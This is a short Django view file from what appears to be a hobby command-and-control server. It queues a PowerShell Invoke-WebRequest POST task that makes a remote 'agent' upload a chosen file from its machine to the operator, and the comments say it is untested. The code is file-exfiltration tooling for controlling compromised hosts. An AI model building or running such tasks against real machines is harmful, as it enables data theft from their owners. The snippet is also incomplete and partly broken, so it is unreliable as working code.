#I want the Agent also to upload his file to the upload path using a full POST request to the file upload funtion just as if we uploaded it in GUI 
#and we can later download it 

import os
from blog.views import *
from blog.models import *

current_path= os.path.dirname(os.path.abspath(__file__))
#Filename to be downloaded from Agent
def Download (request, agent='',FilePATH=''):
    if request.method=='POST':
        task = "Invoke-WebRequest -UseBasicParsing -Uri $uploadFunctionPath -Body {} -Method 'POST'".format(FilePATH)   #I still need to test this POST req a file
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
    else:
        return render(request, 'blog/listeners.html')
    # ls c:\users


